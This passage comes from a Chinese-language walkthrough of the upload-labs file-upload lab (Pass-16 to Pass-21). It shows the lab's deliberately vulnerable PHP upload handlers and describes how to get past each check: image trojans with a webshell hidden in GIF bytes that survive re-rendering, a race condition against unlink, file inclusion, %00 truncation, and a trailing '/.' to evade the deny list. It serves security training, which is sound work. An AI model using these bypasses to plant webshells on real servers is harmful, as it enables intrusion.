    <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'tmp_name'</span>];
    <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">isImage</span>(<span class="hljs-variable">$temp_file</span>);
    <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$res</span>){
        <span class="hljs-variable">$msg</span> = <span class="hljs-string">"文件未知，上传失败！"</span>;
    }<span class="hljs-keyword">else</span>{
        <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">"/"</span>.<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">"YmdHis"</span>).<span class="hljs-string">"."</span>.<span class="hljs-variable">$res</span>;
        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>)){
            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">"上传出错！"</span>;
        }
    }
}</code></pre>
<p>这一关采用了exif_imagetype函数来校验：</p>
<pre><code class="hljs plaintext">exif_imagetype()读取一个图像的第一个字节并检查其后缀名。
返回值与getimage()函数返回的索引2相同，但是速度比getimage快得多。需要开启`php_exif`模块</code></pre>
<p>与上一关步骤相同</p>
<h2 id="pass-17">Pass-17</h2>
<pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'submit'</span>])){
    <span class="hljs-comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span>
    <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>];
    <span class="hljs-variable">$filetype</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'type'</span>];
    <span class="hljs-variable">$tmpname</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'tmp_name'</span>];

    <span class="hljs-variable">$target_path</span>=UPLOAD_PATH.<span class="hljs-string">'/'</span>.<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$filename</span>);

    <span class="hljs-comment">// 获得上传文件的扩展名</span>
    <span class="hljs-variable">$fileext</span>= <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$filename</span>,<span class="hljs-string">"."</span>),<span class="hljs-number">1</span>);

    <span class="hljs-comment">//判断文件后缀与类型，合法才进行上传操作</span>
    <span class="hljs-keyword">if</span>((<span class="hljs-variable">$fileext</span> == <span class="hljs-string">"jpg"</span>) &amp;&amp; (<span class="hljs-variable">$filetype</span>==<span class="hljs-string">"image/jpeg"</span>)){
        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$tmpname</span>,<span class="hljs-variable">$target_path</span>)){
            <span class="hljs-comment">//使用上传的图片生成新的图片</span>
            <span class="hljs-variable">$im</span> = <span class="hljs-title function_ invoke__">imagecreatefromjpeg</span>(<span class="hljs-variable">$target_path</span>);

            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$im</span> == <span class="hljs-literal">false</span>){
                <span class="hljs-variable">$msg</span> = <span class="hljs-string">"该文件不是jpg格式的图片！"</span>;
                @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$target_path</span>);
            }<span class="hljs-keyword">else</span>{
                <span class="hljs-comment">//给新图片指定文件名</span>
                <span class="hljs-title function_ invoke__">srand</span>(<span class="hljs-title function_ invoke__">time</span>());
                <span class="hljs-variable">$newfilename</span> = <span class="hljs-title function_ invoke__">strval</span>(<span class="hljs-title function_ invoke__">rand</span>()).<span class="hljs-string">".jpg"</span>;
                <span class="hljs-comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span>
                <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">'/'</span>.<span class="hljs-variable">$newfilename</span>;
                <span class="hljs-title function_ invoke__">imagejpeg</span>(<span class="hljs-variable">$im</span>,<span class="hljs-variable">$img_path</span>);
                @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$target_path</span>);
                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
            }
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">"上传出错！"</span>;
        }

    }<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((<span class="hljs-variable">$fileext</span> == <span class="hljs-string">"png"</span>) &amp;&amp; (<span class="hljs-variable">$filetype</span>==<span class="hljs-string">"image/png"</span>)){
        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$tmpname</span>,<span class="hljs-variable">$target_path</span>)){
            <span class="hljs-comment">//使用上传的图片生成新的图片</span>
            <span class="hljs-variable">$im</span> = <span class="hljs-title function_ invoke__">imagecreatefrompng</span>(<span class="hljs-variable">$target_path</span>);

            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$im</span> == <span class="hljs-literal">false</span>){
                <span class="hljs-variable">$msg</span> = <span class="hljs-string">"该文件不是png格式的图片！"</span>;
                @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$target_path</span>);
            }<span class="hljs-keyword">else</span>{
                 <span class="hljs-comment">//给新图片指定文件名</span>
                <span class="hljs-title function_ invoke__">srand</span>(<span class="hljs-title function_ invoke__">time</span>());
                <span class="hljs-variable">$newfilename</span> = <span class="hljs-title function_ invoke__">strval</span>(<span class="hljs-title function_ invoke__">rand</span>()).<span class="hljs-string">".png"</span>;
                <span class="hljs-comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span>
                <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">'/'</span>.<span class="hljs-variable">$newfilename</span>;
                <span class="hljs-title function_ invoke__">imagepng</span>(<span class="hljs-variable">$im</span>,<span class="hljs-variable">$img_path</span>);

                @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$target_path</span>);
                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;               
            }
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">"上传出错！"</span>;
        }

    }<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((<span class="hljs-variable">$fileext</span> == <span class="hljs-string">"gif"</span>) &amp;&amp; (<span class="hljs-variable">$filetype</span>==<span class="hljs-string">"image/gif"</span>)){
        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$tmpname</span>,<span class="hljs-variable">$target_path</span>)){
            <span class="hljs-comment">//使用上传的图片生成新的图片</span>
            <span class="hljs-variable">$im</span> = <span class="hljs-title function_ invoke__">imagecreatefromgif</span>(<span class="hljs-variable">$target_path</span>);
            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$im</span> == <span class="hljs-literal">false</span>){
                <span class="hljs-variable">$msg</span> = <span class="hljs-string">"该文件不是gif格式的图片！"</span>;
                @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$target_path</span>);
            }<span class="hljs-keyword">else</span>{
                <span class="hljs-comment">//给新图片指定文件名</span>
                <span class="hljs-title function_ invoke__">srand</span>(<span class="hljs-title function_ invoke__">time</span>());
                <span class="hljs-variable">$newfilename</span> = <span class="hljs-title function_ invoke__">strval</span>(<span class="hljs-title function_ invoke__">rand</span>()).<span class="hljs-string">".gif"</span>;
                <span class="hljs-comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span>
                <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">'/'</span>.<span class="hljs-variable">$newfilename</span>;
                <span class="hljs-title function_ invoke__">imagegif</span>(<span class="hljs-variable">$im</span>,<span class="hljs-variable">$img_path</span>);

                @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$target_path</span>);
                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
            }
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">"上传出错！"</span>;
        }
    }<span class="hljs-keyword">else</span>{
        <span class="hljs-variable">$msg</span> = <span class="hljs-string">"只允许上传后缀为.jpg|.png|.gif的图片文件！"</span>;
    }
}</code></pre>
<pre><code class="hljs scss">补充知识：
二次渲染：后端重写文件内容
<span class="hljs-built_in">basename</span>(path[,suffix]) ，没指定suffix则返回后缀名，有则不返回指定的后缀名
<span class="hljs-built_in">strrchr</span>(string,char)函数查找字符串在另一个字符串中最后一次出现的位置，并返回从该位置到字符串
结尾的所有字符。
<span class="hljs-built_in">imagecreatefromgif</span>()：创建一块画布，并从GIF文件或URL地址载入一副图像
<span class="hljs-built_in">imagecreatefromjpeg</span>()：创建一块画布，并从JPEG文件或URL地址载入一副图像
<span class="hljs-built_in">imagecreatefrompng</span>()：创建一块画布，并从PNG文件或URL
<span class="hljs-built_in">imagecreatefromgif</span>()函数：相当于创建一个新图像

<span class="hljs-built_in">unlink</span>()函数：删除文件（前面的@表示不显示可能出现的错误）
strval()函数：用于获取变量的字符串值。
imagegif()函数：以 GIF 格式将图像输出到浏览器或文件</code></pre>
<p><strong>总结：如果我们上传的是gif图像，这里会重新生成一个图像，并且随机文件名。在返回图像到浏览器后，就删除图像。也就是二次渲染</strong></p>
<p><strong>关于绕过gif的二次渲染，我们只需要找到渲染前后没有变化的位置，然后将php代码写进去，就可以成功上传带有php代码的图片了。</strong></p>
<p>我们可以依旧制作图片马，接着上传之后，将服务器上的最终的图片马下载下来，两者对比，在内容没有发生变化的地方添加一句话木马即可</p>
<h2 id="pass-18">Pass-18</h2>
<pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;

<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'submit'</span>])){
    <span class="hljs-variable">$ext_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">'jpg'</span>,<span class="hljs-string">'png'</span>,<span class="hljs-string">'gif'</span>);
    <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>];
    <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'tmp_name'</span>];
    <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$file_name</span>,<span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$file_name</span>,<span class="hljs-string">"."</span>)+<span class="hljs-number">1</span>);
    <span class="hljs-variable">$upload_file</span> = UPLOAD_PATH . <span class="hljs-string">'/'</span> . <span class="hljs-variable">$file_name</span>;

    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$upload_file</span>)){
        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>)){
             <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">'/'</span>. <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">"YmdHis"</span>).<span class="hljs-string">"."</span>.<span class="hljs-variable">$file_ext</span>;
             <span class="hljs-title function_ invoke__">rename</span>(<span class="hljs-variable">$upload_file</span>, <span class="hljs-variable">$img_path</span>);
             <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
        }<span class="hljs-keyword">else</span>{
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">"只允许上传.jpg|.png|.gif类型文件！"</span>;
            <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$upload_file</span>);
        }
    }<span class="hljs-keyword">else</span>{
        <span class="hljs-variable">$msg</span> = <span class="hljs-string">'上传出错！'</span>;
    }
}</code></pre>
<p>这里可以上传图片马。也有条件竞争：</p>
<p>注意关键函数unlink函数，由于这里的代码逻辑是，不论什么文件，先上传后判断，接着如果文件后缀不符合规定再决定是否删除。</p>
<p>但如果我们在文件删除之前就读取到该文件，那文件就不能被正常删除了：<strong>直接上传1.php，使用Burp拦截</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240202151708985.png" alt="image-20240202151708985"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240202151719186.png" alt="image-20240202151719186"></p>
<p>如上图进行修改后，我们先正常上传图片，复制以下图片的路径，方便后续的访问。</p>
<p>在bp开始attack之后，我们不断的execute去访问上传的文件即可</p>
<h2 id="pass-19">Pass-19</h2>
<pre><code class="hljs php"><span class="hljs-comment">//index.php</span>
<span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'submit'</span>]))
{
    <span class="hljs-keyword">require_once</span>(<span class="hljs-string">"./myupload.php"</span>);
    <span class="hljs-variable">$imgFileName</span> =<span class="hljs-title function_ invoke__">time</span>();
    <span class="hljs-variable">$u</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyUpload</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>], <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'tmp_name'</span>], <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'size'</span>],<span class="hljs-variable">$imgFileName</span>);
    <span class="hljs-variable">$status_code</span> = <span class="hljs-variable">$u</span>-&gt;<span class="hljs-title function_ invoke__">upload</span>(UPLOAD_PATH);
    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$status_code</span>) {
        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:
            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
            <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$u</span>-&gt;cls_upload_dir . <span class="hljs-variable">$u</span>-&gt;cls_file_rename_to;
            <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">'文件已经被上传，但没有重命名。'</span>;
            <span class="hljs-keyword">break</span>; 
        <span class="hljs-keyword">case</span> -<span class="hljs-number">1</span>:
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">'这个文件不能上传到服务器的临时文件存储目录。'</span>;
            <span class="hljs-keyword">break</span>; 
        <span class="hljs-keyword">case</span> -<span class="hljs-number">2</span>:
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">'上传失败，上传目录不可写。'</span>;
            <span class="hljs-keyword">break</span>; 
        <span class="hljs-keyword">case</span> -<span class="hljs-number">3</span>:
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">'上传失败，无法上传该类型文件。'</span>;
            <span class="hljs-keyword">break</span>; 
        <span class="hljs-keyword">case</span> -<span class="hljs-number">4</span>:
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">'上传失败，上传的文件过大。'</span>;
            <span class="hljs-keyword">break</span>; 
        <span class="hljs-keyword">case</span> -<span class="hljs-number">5</span>:
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">'上传失败，服务器已经存在相同名称文件。'</span>;
            <span class="hljs-keyword">break</span>; 
        <span class="hljs-keyword">case</span> -<span class="hljs-number">6</span>:
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">'文件无法上传，文件不能复制到目标目录。'</span>;
            <span class="hljs-keyword">break</span>;      
        <span class="hljs-keyword">default</span>:
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">'未知错误！'</span>;
            <span class="hljs-keyword">break</span>;
    }
}

<span class="hljs-comment">//myupload.php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyUpload</span></span>{
......
......
...... 
  <span class="hljs-keyword">var</span> <span class="hljs-variable">$cls_arr_ext_accepted</span> = <span class="hljs-keyword">array</span>(
      <span class="hljs-string">".doc"</span>, <span class="hljs-string">".xls"</span>, <span class="hljs-string">".txt"</span>, <span class="hljs-string">".pdf"</span>, <span class="hljs-string">".gif"</span>, <span class="hljs-string">".jpg"</span>, <span class="hljs-string">".zip"</span>, <span class="hljs-string">".rar"</span>, <span class="hljs-string">".7z"</span>,<span class="hljs-string">".ppt"</span>,
      <span class="hljs-string">".html"</span>, <span class="hljs-string">".xml"</span>, <span class="hljs-string">".tiff"</span>, <span class="hljs-string">".jpeg"</span>, <span class="hljs-string">".png"</span> );

......
......
......  
  <span class="hljs-comment">/** upload()</span>
<span class="hljs-comment">   **</span>
<span class="hljs-comment">   ** Method to upload the file.</span>
<span class="hljs-comment">   ** This is the only method to call outside the class.</span>
<span class="hljs-comment">   ** <span class="hljs-doctag">@para</span> String name of directory we upload to</span>
<span class="hljs-comment">   ** <span class="hljs-doctag">@returns</span> void</span>
<span class="hljs-comment">  **/</span>
  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload</span>(<span class="hljs-params"> <span class="hljs-variable">$dir</span> </span>)</span>{
    
    <span class="hljs-variable">$ret</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">isUploadedFile</span>();
    
    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> ){
      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">resultUpload</span>( <span class="hljs-variable">$ret</span> );
    }

    <span class="hljs-variable">$ret</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">setDir</span>( <span class="hljs-variable">$dir</span> );
    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> ){
      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">resultUpload</span>( <span class="hljs-variable">$ret</span> );
    }

    <span class="hljs-variable">$ret</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">checkExtension</span>();
    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> ){
      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">resultUpload</span>( <span class="hljs-variable">$ret</span> );
    }

    <span class="hljs-variable">$ret</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">checkSize</span>();
    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> ){
      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">resultUpload</span>( <span class="hljs-variable">$ret</span> );    
    }
    
    <span class="hljs-comment">// if flag to check if the file exists is set to 1</span>
    
    <span class="hljs-keyword">if</span>( <span class="hljs-variable language_">$this</span>-&gt;cls_file_exists == <span class="hljs-number">1</span> ){
      
      <span class="hljs-variable">$ret</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">checkFileExists</span>();
      <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> ){
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">resultUpload</span>( <span class="hljs-variable">$ret</span> );    
      }
    }

    <span class="hljs-comment">// if we are here, we are ready to move the file to destination</span>

    <span class="hljs-variable">$ret</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">move</span>();
    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> ){
      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">resultUpload</span>( <span class="hljs-variable">$ret</span> );    
    }

    <span class="hljs-comment">// check if we need to rename the file</span>

    <span class="hljs-keyword">if</span>( <span class="hljs-variable language_">$this</span>-&gt;cls_rename_file == <span class="hljs-number">1</span> ){
      <span class="hljs-variable">$ret</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">renameFile</span>();
      <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> ){
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">resultUpload</span>( <span class="hljs-variable">$ret</span> );    
      }
    }
    
    <span class="hljs-comment">// if we are here, everything worked as planned :)</span>

    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">resultUpload</span>( <span class="hljs-string">"SUCCESS"</span> );
  
  }
......
......
...... 
};</code></pre>
<p>分析：本Pass做了白名单校验，文件上传后先保存在对象中，随后对文件进行判断存在、检查扩展名、检查大小、重命名、移动操作，没有判断文件头和二次渲染。我们可以使用图片木马配合文件包含漏洞进行绕过。（虽然进行了移动和重命名，但是网页会回显地址）上传，随后使用文件包含漏洞访问该文件</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240202152618575.png" alt="image-20240202152618575"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240202152624545.png" alt="image-20240202152624545"></p>
<h2 id="pass-20">Pass-20</h2>
<pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'submit'</span>])) {
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) {
        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">"php"</span>,<span class="hljs-string">"php5"</span>,<span class="hljs-string">"php4"</span>,<span class="hljs-string">"php3"</span>,<span class="hljs-string">"php2"</span>,<span class="hljs-string">"html"</span>,<span class="hljs-string">"htm"</span>,<span class="hljs-string">"phtml"</span>,<span class="hljs-string">"pht"</span>,<span class="hljs-string">"jsp"</span>,<span class="hljs-string">"jspa"</span>,<span class="hljs-string">"jspx"</span>,<span class="hljs-string">"jsw"</span>,<span class="hljs-string">"jsv"</span>,<span class="hljs-string">"jspf"</span>,<span class="hljs-string">"jtml"</span>,<span class="hljs-string">"asp"</span>,<span class="hljs-string">"aspx"</span>,<span class="hljs-string">"asa"</span>,<span class="hljs-string">"asax"</span>,<span class="hljs-string">"ascx"</span>,<span class="hljs-string">"ashx"</span>,<span class="hljs-string">"asmx"</span>,<span class="hljs-string">"cer"</span>,<span class="hljs-string">"swf"</span>,<span class="hljs-string">"htaccess"</span>);

        <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">'save_name'</span>];
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$file_name</span>,PATHINFO_EXTENSION);

        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$deny_ext</span>)) {
            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'tmp_name'</span>];
            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">'/'</span> .<span class="hljs-variable">$file_name</span>;
            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) { 
                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
            }<span class="hljs-keyword">else</span>{
                <span class="hljs-variable">$msg</span> = <span class="hljs-string">'上传出错！'</span>;
            }
        }<span class="hljs-keyword">else</span>{
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">'禁止保存为该类型文件！'</span>;
        }

    } <span class="hljs-keyword">else</span> {
        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">'文件夹不存在,请手工创建！'</span>;
    }
}</code></pre>
<p>pathinfo() 函数以数组的形式返回关于文件路径的信息，返回的数组元素如下：</p>
<ul>
<li><strong>[dirname]: 目录路径</strong></li>
<li><strong>[basename]: 文件名</strong></li>
<li><strong>[extension]: 文件后缀名</strong></li>
<li><strong>[filename]: 不包含后缀的文件名</strong></li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240202152844934.png" alt="image-20240202152844934"></p>
<p>这一关只检查了文件后缀名，且没有限制大小写。很容易绕过</p>
<ul>
<li>
<p>这关也可以直接利用文件包含漏洞上传图片马</p>
</li>
<li>
<p>利用%00截断绕过（注意版本）</p>
</li>
<li>
<p>move_uploaded_file()有这么一个特性，会忽略掉文件末尾的 /.（可以在后缀名添加/.即可绕过黑名单）</p>
</li>
</ul>
<h2 id="pass-21">Pass-21</h2>
<pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'upload_file'</span>])){
    <span class="hljs-comment">//检查MIME</span>
    <span class="hljs-variable">$allow_type</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">'image/jpeg'</span>,<span class="hljs-string">'image/png'</span>,<span class="hljs-string">'image/gif'</span>);
    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'type'</span>],<span class="hljs-variable">$allow_type</span>)){
        <span class="hljs-variable">$msg</span> = <span class="hljs-string">"禁止上传该类型文件!"</span>;
    }<span class="hljs-keyword">else</span>{
        <span class="hljs-comment">//检查文件名</span>
        <span class="hljs-variable">$file</span> = <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'save_name'</span>]) ? <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>] : <span class="hljs-variable">$_POST</span>[<span class="hljs-string">'save_name'</span>];
        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$file</span>)) {
            <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">'.'</span>, <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file</span>));
        }

        <span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">end</span>(<span class="hljs-variable">$file</span>);
        <span class="hljs-variable">$allow_suffix</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">'jpg'</span>,<span class="hljs-string">'png'</span>,<span class="hljs-string">'gif'</span>);
        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$ext</span>, <span class="hljs-variable">$allow_suffix</span>)) {
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">"禁止上传该后缀文件!"</span>;
        }<span class="hljs-keyword">else</span>{
